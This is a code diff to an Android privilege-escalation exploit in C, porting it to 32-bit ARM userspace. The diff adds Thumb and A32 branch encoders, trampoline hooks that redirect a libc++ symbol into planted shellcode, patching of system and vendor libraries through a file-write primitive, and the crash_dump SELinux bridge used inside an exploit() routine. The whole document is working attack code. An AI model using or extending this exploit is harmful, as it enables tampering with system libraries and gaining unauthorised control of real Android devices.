@@ -19,7 +19,18 @@
 
 #define eos(s) (s + strlen(s))
 
-static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
+#if defined(__arm__)
+/* arm32 userspace (arm64 kernel): every file we patch lives in the 32-bit
+ * namespace, and the SELinux bridge is crash_dump32. The kernel module and the
+ * hook target's bitness stay tied to the kernel/userspace build respectively. */
+#define DF_TARGET32 1
+static const char kCrashDump[]  = "/apex/com.android.runtime/bin/crash_dump32";
+static const char kLibcxxPath[] = "/system/lib/libc++.so";
+#else
+#define DF_TARGET32 0
+static const char kCrashDump[]  = "/apex/com.android.runtime/bin/crash_dump64";
+static const char kLibcxxPath[] = "/system/lib64/libc++.so";
+#endif
 static char    *libcxx_ko_target;
 
 static int      g_encap_port;
@@ -30,7 +41,8 @@ static uint32_t g_seq = 1;
 struct PatchRestore {
     const char *lib;
     uint64_t    tramp_aligned;
-    uint8_t     tramp_orig[16];
+    uint8_t     tramp_orig[32];
+    int         tramp_len;
     uint64_t    shell_off;
     uint32_t    shell_padded;
     char        shell_orig[1024];
@@ -385,7 +397,7 @@ static void cleanup(void) {
     if (!g_libcxx_r.valid) return;
     printf("\n=== cleanup ===\n");
     printf("restoring trampoline in %s\n", g_libcxx_r.lib);
-    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
+    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, (size_t)g_libcxx_r.tramp_len,
                    (size_t)g_libcxx_r.tramp_aligned, 0);
     printf("restoring shellcode in %s\n", g_libcxx_r.lib);
     patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
@@ -394,12 +406,67 @@ static void cleanup(void) {
 
 int find_hook_target(const char *lib, const char *sym,
                      uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
-                     size_t shellcode_size);
+                     size_t shellcode_size, int *thumb);
+
+/* ---- branch encoders ---- */
+
+#if !DF_TARGET32
+static uint32_t branch_a64(uint64_t from, uint64_t to)
+{
+    int64_t off = (int64_t)to - (int64_t)from;
+    if ((off & 3) || off < -(1LL << 27) || off >= (1LL << 27)) return 0;
+    return 0x14000000u | (((uint32_t)(off >> 2)) & 0x03FFFFFDu);
+}
+#else
+/* ARMv7 B.W (T4): offset relative to insn+4 */
+static uint32_t branch_thumb(uint32_t from, uint32_t to)
+{
+    int32_t off = (int32_t)(to - (from + 4));
+    if (off & 1) return 0;
+    if (off < -(1 << 24) || off >= (1 << 24)) return 0;
+    uint32_t S = ((uint32_t)off >> 24) & 1;
+    uint32_t I1 = ((uint32_t)off >> 23) & 1;
+    uint32_t I2 = ((uint32_t)off >> 22) & 1;
+    uint32_t imm10 = ((uint32_t)off >> 12) & 0x3FF;
+    uint32_t imm11 = ((uint32_t)off >> 1) & 0x7FF;
+    uint32_t J1 = (~(I1 ^ S)) & 1;
+    uint32_t J2 = (~(I2 ^ S)) & 1;
+    uint32_t hw1 = 0xF000 | (S << 10) | imm10;
+    uint32_t hw2 = 0x9000 | (J1 << 13) | (J2 << 11) | imm11;
+    return hw1 | (hw2 << 16);          /* little-endian halfword pair */
+}
+
+/* ARM (A32) B: offset relative to insn+8 */
+static uint32_t branch_arm(uint32_t from, uint32_t to)
+{
+    int32_t off = (int32_t)(to - (from + 8));
+    if ((off & 3) || off < -(1 << 25) || off >= (1 << 25)) return 0;
+    return 0xEA000000u | (((uint32_t)off >> 2) & 0x00FFFFFFu);
+}
+
+/* Length of a Thumb-2 instruction in bytes, from its first halfword. */
+static int thumb_insn_len(uint32_t insn)
+{
+    unsigned top = (unsigned)((insn & 0xFFFFu) >> 11);
+    return (top == 0x1Du || top == 0x1Eu || top == 0x1Fu) ? 4 : 2;
+}
+#endif
+
+static uint32_t mk_branch(uint64_t from, uint64_t to, int thumb)
+{
+#if DF_TARGET32
+    return thumb ? branch_thumb((uint32_t)from, (uint32_t)to)
+                 : branch_arm((uint32_t)from, (uint32_t)to);
+#else
+    (void)thumb;
+    return branch_a64(from, to);
+#endif
+}
 
 static int patch_hook(const char *lib, const char *sym,
                       char *stage_data, uint32_t stage_len, char *stage_start,
-                      char *first_inst_copy, struct PatchRestore *restore) {
-    const uint32_t BRANCH = 0x14000000;
+                      char *first_inst_copy, struct PatchRestore *restore)
+{
     uint32_t start_delta = (uint32_t)(stage_start - stage_data);
 
     size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
@@ -410,28 +477,50 @@ static int patch_hook(const char *lib, const char *sym,
         free(buf); return -1;
     }
 
-    uint64_t hook_off, shell_off; uint32_t first_insn;
+    uint64_t hook_off, shell_off; uint32_t first_insn; int thumb = 0;
     printf("Finding symbol offsets for %s:\n", lib);
-    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded)) {
+    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded, &thumb)) {
         printf("failed to find offsets for %s\n", lib); free(buf); return 1;
     }
-    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);
+    printf("Found: hook=0x%lx shellcode=0x%lx len=%u%s\n",
+           (unsigned long)hook_off, (unsigned long)shell_off, stage_len,
+           thumb ? " (thumb)" : "");
 
-    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);
+    /* The trampoline must cover a whole instruction: 4 bytes on both AArch64
+     * and Thumb-2. A 16-bit Thumb site is rejected by elf_parser already. */
+    int insn_len = 4;
+#if DF_TARGET32
+    if (thumb && thumb_insn_len(first_insn) != 4) insn_len = 2;
+#endif
+
+    uint32_t hook_insn = mk_branch(hook_off, shell_off + start_delta, thumb);
+    if (!hook_insn) {
+        printf("patch: %s - hook branch out of range\n", lib);
+        free(buf); return -1;
+    }
 
     if (first_insn == hook_insn) {
         printf("%s already patched\n", lib); free(buf); return 0;
     }
-    uint32_t jmpback = BRANCH |
-        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
+
+    uint32_t jmpback = mk_branch(shell_off + stage_len - 4, hook_off + insn_len, thumb);
+    if (!jmpback) {
+        printf("patch: %s - jump-back branch out of range\n", lib);
+        free(buf); return -1;
+    }
     *(uint32_t *)&buf[stage_len - 4] = jmpback;
     *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;
 
+    /* The trampoline may straddle a 16-byte CBC block; then patch the aligned
+     * 32-byte pair so both blocks are computed from one consistent old state. */
     uint64_t aligned = hook_off & ~(uint64_t)15;
+    int pos = (int)(hook_off & 15);
+    int blk_len = (pos + 4 > 16) ? 32 : 16;
+
     int fd = open(lib, O_RDONLY);
     if (fd < 0) { printf("open %s failed: %s\n", lib, strerror(errno)); free(buf); return -1; }
     int ok = pread(fd, restore->shell_orig, padded,  (off_t)shell_off) == (ssize_t)padded
-          && pread(fd, restore->tramp_orig, 16,       (off_t)aligned)  == 16;
+          && pread(fd, restore->tramp_orig, blk_len, (off_t)aligned)  == (ssize_t)blk_len;
     close(fd);
     if (!ok) { printf("pread %s save failed\n", lib); free(buf); return -1; }
 
@@ -439,6 +528,7 @@ static int patch_hook(const char *lib, const char *sym,
     restore->shell_off     = shell_off;
     restore->shell_padded  = (uint32_t)padded;
     restore->tramp_aligned = aligned;
+    restore->tramp_len     = blk_len;
     restore->valid         = 1;
 
     printf("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
@@ -446,12 +536,11 @@ static int patch_hook(const char *lib, const char *sym,
     free(buf);
     if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }
 
-    int pos = (int)(hook_off & 15);
-    uint8_t blk[16];
-    memcpy(blk, restore->tramp_orig, 16);
+    uint8_t blk[32];
+    memcpy(blk, restore->tramp_orig, (size_t)blk_len);
     memcpy(&blk[pos], &hook_insn, 4);
-    printf("patch: %s <- trampoline (16 bytes)\n", lib);
-    int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
+    printf("patch: %s <- trampoline (%d bytes)\n", lib, blk_len);
+    int ret2 = patch_file_cbc(lib, (char *)blk, (size_t)blk_len, (size_t)aligned, 0);
     if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
     return ret2;
 }
@@ -470,11 +559,20 @@ static int createOrphanProcess(void) {
 }
 
 static const char *detect_ko_target(void) {
+#if DF_TARGET32
+    /* 32-bit userspace ships no lib64 directory */
+    static const char *const candidates[] = {
+        "/vendor/lib/libbinderdebug.so",
+        "/vendor/lib/libstagefrighthw.so",
+        "/vendor/lib/libstagefright_aidl_bufferpool2.so",
+    };
+#else
     static const char *const candidates[] = {
         "/vendor/lib64/libbinderdebug.so",
         "/vendor/lib64/libstagefrighthw.so",
         "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
     };
+#endif
     for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
         if (access(candidates[i], F_OK) == 0)
             return candidates[i];
@@ -543,7 +641,7 @@ static int exploit(void) {
     int rc = 3;
     if (patch_helper()) goto done;
     if (patch_ko()) goto done;
-    if (patch_hook("/system/lib64/libc++.so",
+    if (patch_hook(kLibcxxPath,
                    "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                    libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                    &g_libcxx_r)) goto done;
